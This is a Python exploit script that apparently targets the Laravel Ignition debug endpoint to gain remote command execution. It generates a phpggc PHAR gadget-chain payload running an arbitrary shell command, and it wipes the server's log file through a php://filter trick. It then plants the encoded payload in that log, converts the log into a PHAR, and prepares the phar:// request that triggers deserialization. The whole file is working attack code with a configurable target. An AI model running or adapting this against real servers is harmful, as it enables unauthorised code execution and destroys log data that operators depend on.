#!/usr/bin/env python3
import base64
import json
import os
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request

TARGET = os.environ.get("TARGET_URL", "http://localhost:8080/_ignition/execute-solution")
LOG = os.environ.get("LOG_PATH", "/var/www/storage/logs/laravel.log")
HERE = os.path.dirname(os.path.abspath(__file__))
PHPGGC = os.path.join(HERE, "phpggc", "phpggc")


def send(view_file: str) -> None:
    body = json.dumps({
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {"variableName": "x", "viewFile": view_file},
    }, separators=(",", ":")).encode("utf-8")
    req = urllib.request.Request(
        TARGET, data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=10).read()
    except urllib.error.HTTPError:
        pass
    except Exception as exc:
        print(f"[warn] {type(exc).__name__}: {exc}", file=sys.stderr)


def make_phar(cmd: str) -> bytes:
    """Generate a PHAR. Try monolog/rce1 then monolog/rce2."""
    last_err = None
    for chain in ("monolog/rce1", "monolog/rce2"):
        fd, path = tempfile.mkstemp(suffix=".phar")
        os.close(fd)
        try:
            r = subprocess.run(
                ["php", "-d", "phar.readonly=0", PHPGGC,
                 "-p", "phar", "-o", path, chain, "system", cmd],
                capture_output=True, text=True, timeout=20,
            )
            if r.returncode != 0 or os.path.getsize(path) == 0:
                last_err = f"{chain} rc={r.returncode} err={r.stderr[:200]}"
                continue
            with open(path, "rb") as f:
                data = f.read()
            print(f"[*] generated PHAR via {chain}: {len(data)} bytes", file=sys.stderr)
            return data
        except Exception as e:
            last_err = f"{chain}: {e}"
        finally:
            try:
                os.unlink(path)
            except OSError:
                pass
    raise SystemExit(f"[fatal] phpggc failed: {last_err}")


def main() -> None:
    cmd = " ".join(sys.argv[1:]) or "id"
    phar = make_phar(cmd)

    # ---- FIX: interleave null bytes via quoted-printable encoding ----
    # Each base64 char becomes "X=00" so that:
    #   QP-decode   -> "X\0"
    #   UTF-16LE    -> "X"
    #   base64-decode -> original bytes
    b64 = base64.b64encode(phar).decode("ascii").rstrip("=")
    encoded = "".join(c + "=00" for c in b64)
    payload = "A" * 100 + encoded
    print(f"[*] payload length: {len(payload)} chars", file=sys.stderr)

    # 1) Truncate log via `consumed` filter
    #    file_get_contents fails (filter not found) -> makeOptional returns ""
    #    file_put_contents then truncates the log file to zero bytes.
    send(f"php://filter/read=consumed/resource={LOG}")

    # 2) Padding entry (even-length filler)
    send("AA")

    # 3) Payload entry (gets written into the log as part of an error line)
    send(payload)

    # 4) Convert the log into a valid PHAR using the Ambionics filter chain
    send(
        "php://filter/write=convert.quoted-printable-decode"
        "|convert.iconv.utf-16le.utf-8"
        "|convert.base64-decode"
        f"/resource={LOG}"
    )

    # 5) Trigger the deserialization
    final_body = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "x",
            "viewFile": f"phar://{LOG}/test.txt",
        },
    }
    sys.stdout.write(json.dumps(final_body, separators=(",", ":")))


if __name__ == "__main__":
    main()